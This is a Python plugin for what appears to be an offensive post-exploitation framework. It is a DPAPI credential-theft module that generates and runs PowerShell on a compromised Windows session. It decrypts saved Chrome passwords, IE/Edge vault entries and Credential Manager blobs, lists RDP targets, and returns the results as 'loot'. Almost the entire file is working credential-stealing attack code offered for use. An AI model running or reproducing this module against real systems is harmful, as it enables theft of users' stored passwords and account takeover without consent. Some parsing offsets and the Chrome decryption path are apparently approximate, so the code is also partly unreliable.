"""
credential_access/dpapi_decrypt — DPAPI master key and blob decryption. MITRE T1555.004.
Decrypts DPAPI-protected secrets (Chrome passwords, IE credentials, RDP passwords,
WiFi PSKs, user certificate private keys) using the current user's context
or a domain backup key for offline decryption.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class DpapiDecrypt(BasePlugin):
    NAME        = "dpapi_decrypt"
    DESCRIPTION = "Decrypt DPAPI-protected secrets (Chrome, IE, RDP, WiFi, certs) (T1555.004)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1555.004"
    CATEGORY    = "credential_access"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("target", str, required=False, default="all",
              help="all | chrome | ie | rdp | wifi | vault | blob"),
        Param("blob_b64", str, required=False, default="",
              help="[blob] Base64-encoded DPAPI blob to decrypt"),
        Param("masterkey_dir", str, required=False, default="",
              help="Path to MasterKey directory (blank = current user default)"),
        Param("entropy_b64", str, required=False, default="",
              help="Optional base64 entropy passed to CryptUnprotectData"),
        Param("all_users", bool, required=False, default=False,
              help="Try to decrypt blobs for all user profiles (requires SYSTEM)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target    = params.get("target", "all").lower()
        blob_b64  = params.get("blob_b64", "")
        mk_dir    = params.get("masterkey_dir", "")
        entropy   = params.get("entropy_b64", "")
        all_users = params.get("all_users", False)

        if target == "blob" and not blob_b64:
            return ModuleResult.err("blob_b64 required for target=blob")

        ps = self._build_ps(target, blob_b64, mk_dir, entropy, all_users)
        r  = ctx.ps(ps, timeout=60)
        if r["status"] != "ok":
            return ModuleResult.err(f"dpapi_decrypt failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="dpapi_decrypt")

    @staticmethod
    def _build_ps(target: str, blob_b64: str, mk_dir: str,
                  entropy_b64: str, all_users: bool) -> str:
        entropy_block = ""
        if entropy_b64:
            entropy_block = f"""
$entropyBytes = [Convert]::FromBase64String('{entropy_b64}')
"""
        else:
            entropy_block = "$entropyBytes = $null"

        targets_block = ""
        if target in ("all", "blob"):
            if blob_b64:
                targets_block += f"""
# Decrypt arbitrary DPAPI blob
$blobBytes = [Convert]::FromBase64String('{blob_b64}')
$plaintext = [DPAPI]::Decrypt($blobBytes, $entropyBytes)
if ($plaintext) {{ $results += "[+] Blob: " + [System.Text.Encoding]::UTF8.GetString($plaintext) }}
else {{ $results += "[-] Blob decryption failed" }}
"""

        if target in ("all", "chrome"):
            targets_block += r"""
# Chrome Login Data
$chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromeDb) {
    $results += "[*] Chrome passwords:"
    try {
        # Read via temp copy (db is locked)
        $tmp = [System.IO.Path]::GetTempFileName()
        Copy-Item $chromeDb $tmp -Force
        Add-Type -AssemblyName System.Data
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $rdr = $cmd.ExecuteReader()
        while ($rdr.Read()) {
            $url  = $rdr.GetString(0); $user = $rdr.GetString(1)
            $enc  = [byte[]]$rdr[2]
            # Chrome 80+ uses AES-256-GCM with a key from Local State
            $pt   = [DPAPI]::Decrypt($enc, $null)
            $pass = if ($pt) { [System.Text.Encoding]::UTF8.GetString($pt) } else { "(AES-encrypted — extract key first)" }
            if ($user) { $results += "  $url | $user | $pass" }
        }
        $rdr.Close(); $conn.Close()
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    } catch { $results += "  [-] SQLite unavailable — dumping raw blob paths"; $results += "  Use: SharpChrome.exe or Mimikatz dpapi::chrome" }
} else { $results += "[-] Chrome Login Data not found" }
"""

        if target in ("all", "ie"):
            targets_block += r"""
# Internet Explorer / Edge (Legacy) credentials
$results += "[*] IE/Edge credentials:"
$vaultPath = "$env:LOCALAPPDATA\Microsoft\Vault"
if (Test-Path $vaultPath) {
    Get-ChildItem $vaultPath -Recurse -Filter "*.vcrd" -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $vcrd  = [System.IO.File]::ReadAllBytes($_.FullName)
            # VCRD format: header + DPAPI blob at offset 0x24
            if ($vcrd.Length -gt 0x40) {
                $blobLen = [BitConverter]::ToInt32($vcrd, 0x20)
                if ($blobLen -gt 0 -and $blobLen + 0x24 -le $vcrd.Length) {
                    $blob = $vcrd[0x24..($blobLen + 0x23)]
                    $pt   = [DPAPI]::Decrypt([byte[]]$blob, $null)
                    if ($pt) { $results += "  $($_.Name): " + [System.Text.Encoding]::Unicode.GetString($pt) }
                }
            }
        } catch {}
    }
}
"""

        if target in ("all", "rdp"):
            targets_block += r"""
# RDP saved credentials (Windows Credential Manager)
$results += "[*] RDP / saved credentials:"
try {
    $cred = [System.Runtime.InteropServices.RuntimeEnvironment]
    $mgr  = New-Object -ComObject WScript.Shell
    $regPath = "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers"
    if (Test-Path $regPath) {
        Get-ChildItem $regPath | ForEach-Object {
            $srv  = $_.PSChildName
            $user = (Get-ItemProperty $_.PSPath -Name UsernameHint -ErrorAction SilentlyContinue).UsernameHint
            $results += "  RDP target: $srv  user: $user"
        }
    }
    # Windows Credential Manager blobs
    $credPath = "$env:LOCALAPPDATA\Microsoft\Credentials"
    if (Test-Path $credPath) {
        Get-ChildItem $credPath -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
            if ($bytes.Length -gt 0x14) {
                $blob = $bytes[0x14..($bytes.Length-1)]
                $pt   = [DPAPI]::Decrypt([byte[]]$blob, $null)
                if ($pt -and $pt.Length -gt 4) {
                    $results += "  CredMan $($_.Name): " + [System.Text.Encoding]::Unicode.GetString($pt) -replace "`0",""
                }
            }
        }
    }
} catch { $results += "  [-] $_" }
"""

        return f"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class DPAPI {{
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DATA_BLOB {{
        public int cbData; public IntPtr pbData;
    }}
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pCipher, out string desc,
        ref DATA_BLOB pEntropy, IntPtr pReserved, IntPtr pPromptStruct,
        int flags, out DATA_BLOB pPlain);
    public static byte[] Decrypt(byte[] encrypted, byte[] entropy) {{
        var ci = new DATA_BLOB();
        ci.cbData = encrypted.Length;
        ci.pbData = Marshal.AllocHGlobal(encrypted.Length);
        Marshal.Copy(encrypted, 0, ci.pbData, encrypted.Length);
        var en = new DATA_BLOB();
        if (entropy != null && entropy.Length > 0) {{
            en.cbData = entropy.Length;
            en.pbData = Marshal.AllocHGlobal(entropy.Length);
            Marshal.Copy(entropy, 0, en.pbData, entropy.Length);
        }}
        var pl = new DATA_BLOB(); string desc;
        try {{
            if (!CryptUnprotectData(ref ci, out desc, ref en, IntPtr.Zero, IntPtr.Zero, 0, out pl)) return null;
            var result = new byte[pl.cbData];
            Marshal.Copy(pl.pbData, result, 0, pl.cbData);
            return result;
        }} finally {{
            Marshal.FreeHGlobal(ci.pbData);
            if (en.pbData != IntPtr.Zero) Marshal.FreeHGlobal(en.pbData);
            if (pl.pbData != IntPtr.Zero) Marshal.FreeHGlobal(pl.pbData);
        }}
    }}
}}
'@
{entropy_block}
$results = @("[*] DPAPI decryption — target: {target}")
{targets_block}
$results -join "`n"
""".strip()
